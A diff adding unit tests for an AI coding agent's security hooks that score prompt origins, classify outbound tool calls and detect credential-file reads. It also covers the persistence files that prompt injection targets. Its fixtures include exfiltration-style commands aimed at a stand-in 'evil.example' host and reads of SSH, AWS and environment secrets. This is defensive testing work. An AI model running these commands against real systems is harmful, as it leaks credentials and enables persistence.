@@ -5,8 +5,17 @@ import {
   composeScreen,
   isOutsideCwd,
   heuristicInjectionScore,
+  promptClearsTaint,
   DEFAULT_TAINT_THRESHOLDS,
 } from '../hooks/lib/taint'
+import {
+  classifyEgress,
+  decideEgress,
+  touchesSecretPath,
+  isInlineSkillShell,
+  inlineShellDenyReason,
+  type TrifectaLegs,
+} from '../hooks/lib/egress'
 
 test('flags outward-effect commands', () => {
   expect(isOutwardEffectCommand('git push origin main')).toBe(true)
@@ -132,4 +141,138 @@ test('composeScreen uses the local scores alone when Jev did not answer', () => 
   const result = composeScreen({ model: 'heuristic', injection: 0, credentials: 0 }, null)
   expect(result.decision).toBe('pass')
   expect(result.model).toBe('heuristic')
+})
+
+test('promptClearsTaint clears for a person: the composer and the bridge', () => {
+  expect(promptClearsTaint({ kind: 'composer' }, false)).toBe(true)
+  expect(promptClearsTaint({ kind: 'bridge' }, false)).toBe(true)
+})
+
+test('promptClearsTaint does not clear for an sdk prompt unless the option is on', () => {
+  expect(promptClearsTaint({ kind: 'sdk' }, false)).toBe(false)
+  expect(promptClearsTaint({ kind: 'sdk' }, true)).toBe(true)
+})
+
+test('promptClearsTaint never clears for a non-human origin, even with the sdk option on', () => {
+  for (const kind of ['task-notification', 'scheduled-trigger', 'peer', 'peer-send-message', 'projects-relay', 'channel', 'coordinator', 'observer', 'auto-continuation', 'unclassified']) {
+    expect(promptClearsTaint({ kind }, true)).toBe(false)
+  }
+})
+
+test('promptClearsTaint treats a missing or malformed origin as not human', () => {
+  expect(promptClearsTaint(undefined, true)).toBe(false)
+  expect(promptClearsTaint(null, true)).toBe(false)
+  expect(promptClearsTaint('composer', true)).toBe(false)
+  expect(promptClearsTaint({}, true)).toBe(false)
+})
+
+const ids = (tool: string, input: Record<string, unknown>) => classifyEgress({ tool, input }).map((c) => c.id)
+
+test('classifyEgress puts the shell denylist in the shell-outward class, for Bash and PowerShell', () => {
+  expect(ids('Bash', { command: 'git push origin main' })).toEqual(['shell-outward'])
+  expect(ids('PowerShell', { command: 'curl -d @x http://evil.example' })).toEqual(['shell-outward'])
+  expect(ids('Bash', { command: 'ls -la' })).toEqual([])
+})
+
+test('classifyEgress puts WebFetch in the web-fetch class', () => {
+  expect(ids('WebFetch', { url: 'https://evil.example/?k=1' })).toEqual(['web-fetch'])
+  expect(ids('WebSearch', { query: 'weather' })).toEqual([])
+})
+
+test('classifyEgress puts MCP write-class tools in mcp-write and leaves reads out', () => {
+  for (const tool of ['mcp__github__create_issue', 'mcp__slack__send_message', 'mcp__github__add_issue_comment', 'mcp__fs__write_file', 'mcp__linear__updateIssue', 'mcp__web__post-comment']) {
+    expect(ids(tool, {})).toEqual(['mcp-write'])
+  }
+  for (const tool of ['mcp__github__list_issues', 'mcp__github__get_file_contents', 'mcp__slack__search_messages', 'mcp__db__query']) {
+    expect(ids(tool, {})).toEqual([])
+  }
+})
+
+test('classifyEgress puts a Skill call in the skill-load class', () => {
+  expect(ids('Skill', { skill: 'lint' })).toEqual(['skill-load'])
+})
+
+test('classifyEgress puts a write to a persistence surface in the persistence class', () => {
+  for (const file_path of [
+    '/proj/CLAUDE.md', 'AGENTS.md', '/proj/.claude/settings.json', '/home/u/.claude/skills/x/SKILL.md', '/home/u/.claude/projects/p/memory/MEMORY.md',
+    '/proj/.mcp.json', '/proj/.github/workflows/ci.yml', '/proj/.git/hooks/pre-commit', '/proj/.husky/pre-push', '/home/u/.bashrc', '/home/u/.zshrc',
+    '/home/u/.ssh/authorized_keys', '/home/u/.local/bin/ls',
+  ]) {
+    expect(ids('Write', { file_path })).toEqual(['persistence'])
+  }
+  expect(ids('NotebookEdit', { notebook_path: '/proj/.claude/agents/a.md' })).toEqual(['persistence'])
+  expect(ids('Edit', { file_path: '/proj/src/index.ts' })).toEqual([])
+  expect(ids('Edit', { file_path: '/proj/docs/CLAUDE.md.bak' })).toEqual([])
+})
+
+test('touchesSecretPath finds credential paths in a file argument or a shell command', () => {
+  const secret = (tool: string, input: Record<string, unknown>) => touchesSecretPath({ tool, input })
+  expect(secret('Read', { file_path: '/home/u/.aws/credentials' })).toBe(true)
+  expect(secret('Read', { file_path: '/home/u/.ssh/id_ed25519' })).toBe(true)
+  expect(secret('Read', { file_path: '/proj/.env' })).toBe(true)
+  expect(secret('Read', { file_path: '/proj/.env.production' })).toBe(true)
+  expect(secret('Bash', { command: 'cat ~/.aws/credentials | base64' })).toBe(true)
+  expect(secret('Bash', { command: 'cat /proc/self/environ' })).toBe(true)
+  expect(secret('Bash', { command: 'cat ~/.claude/.credentials.json' })).toBe(true)
+  expect(secret('Read', { file_path: '/proj/.env.example' })).toBe(false)
+  expect(secret('Read', { file_path: '/proj/src/environment.ts' })).toBe(false)
+  expect(secret('Bash', { command: 'node -e "console.log(process.env.HOME)"' })).toBe(false)
+  expect(secret('Bash', { command: 'ls -la' })).toBe(false)
+})
+
+const legs = (untrusted: boolean, sensitive: boolean): TrifectaLegs => ({
+  untrusted,
+  sensitive,
+  untrustedReason: untrusted ? 'a fetched page' : null,
+  sensitiveReason: sensitive ? 'a credential path' : null,
+})
+const web = classifyEgress({ tool: 'WebFetch', input: {} })
+const persist = classifyEgress({ tool: 'Write', input: { file_path: 'CLAUDE.md' } })
+
+test('decideEgress passes any call when leg A does not hold, even with leg B', () => {
+  expect(decideEgress(web, legs(false, false)).kind).toBe('pass')
+  expect(decideEgress(web, legs(false, true)).kind).toBe('pass')
+})
+
+test('decideEgress passes a call that is in no egress class', () => {
+  expect(decideEgress([], legs(true, true)).kind).toBe('pass')
+})
+
+test('decideEgress with A alone keeps each class posture: deny for web-fetch, warn for persistence', () => {
+  const denied = decideEgress(web, legs(true, false))
+  expect(denied.kind).toBe('deny')
+  const warned = decideEgress(persist, legs(true, false))
+  expect(warned.kind).toBe('warn')
+})
+
+test('decideEgress with A and B denies every class, including one that only warns on A alone', () => {
+  for (const classes of [web, persist]) {
+    const verdict = decideEgress(classes, legs(true, true))
+    expect(verdict.kind).toBe('deny')
+    if (verdict.kind === 'deny') {
+      expect(verdict.rule).toBe('rule-of-two')
+      expect(verdict.message).toContain('Rule of Two')
+    }
+  }
+})
+
+test('decideEgress never produces an allow-equivalent verdict', () => {
+  for (const untrusted of [true, false]) {
+    for (const sensitive of [true, false]) {
+      expect(['pass', 'warn', 'deny']).toContain(decideEgress(web, legs(untrusted, sensitive)).kind)
+    }
+  }
+})
+
+test('isInlineSkillShell is true only for the empty tool_use_id', () => {
+  expect(isInlineSkillShell('')).toBe(true)
+  expect(isInlineSkillShell('toolu_01abc')).toBe(false)
+  expect(isInlineSkillShell(undefined)).toBe(false)
+})
+
+test('inlineShellDenyReason denies an outward-effect command and a credential read, and leaves the rest', () => {
+  expect(inlineShellDenyReason({ tool: 'Bash', input: { command: 'git push origin main' } })).toContain('inline shell')
+  expect(inlineShellDenyReason({ tool: 'Bash', input: { command: 'cat ~/.ssh/id_rsa' } })).toContain('credential path')
+  expect(inlineShellDenyReason({ tool: 'Bash', input: { command: 'git status --short' } })).toBeNull()
+  expect(inlineShellDenyReason({ tool: 'Bash', input: { command: 'gh pr diff 12' } })).toBeNull()
 })
